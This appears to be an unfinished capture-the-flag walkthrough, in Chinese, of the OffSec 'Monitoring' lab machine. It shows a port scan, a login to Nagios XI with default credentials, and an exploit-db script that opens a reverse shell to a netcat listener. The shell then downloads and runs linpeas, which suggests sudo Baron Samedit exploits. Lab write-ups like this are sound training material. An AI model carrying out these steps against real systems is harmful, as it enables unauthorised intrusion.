###### tags: `Offsec` `PG Play` `Easy` `Linux`

# Monitoring(未完成)
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.211.136 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.211.136:25
Open 192.168.211.136:80
Open 192.168.211.136:5667
Open 192.168.211.136:22
Open 192.168.211.136:443
Open 192.168.211.136:389

PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp       syn-ack Postfix smtpd
80/tcp   open  http       syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 8E1494DD4BFF0FC523A2E2A15ED59D84
|_http-title: Nagios XI
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS
389/tcp  open  ldap       syn-ack OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: 400 Bad Request
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=192.168.1.6/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US/organizationalUnitName=Development/localityName=St. Paul
| Issuer: commonName=192.168.1.6/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US/organizationalUnitName=Development/localityName=St. Paul
5667/tcp open  tcpwrapped syn-ack
```

透過80port可看到login頁面，利用[帳號nagiosadmin密碼admin](https://support.nagios.com/forum/viewtopic.php?t=544)可登入頁面

下載[edb-49422](https://www.exploit-db.com/exploits/49422)進行攻擊
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp9001

┌──(kali㉿kali)-[~/pgplay]
└─$ python3 49422.py https://192.168.211.136 nagiosadmin admin 192.168.45.168 9001
```

用`linpeas`
```
www-data@funbox7:/tmp$ wget 192.168.45.177/linpeas.sh
www-data@funbox7:/tmp$ chmod +x linpeas.sh
www-data@funbox7:/tmp$ ./linpeas.sh 

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester 
...
[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
...
```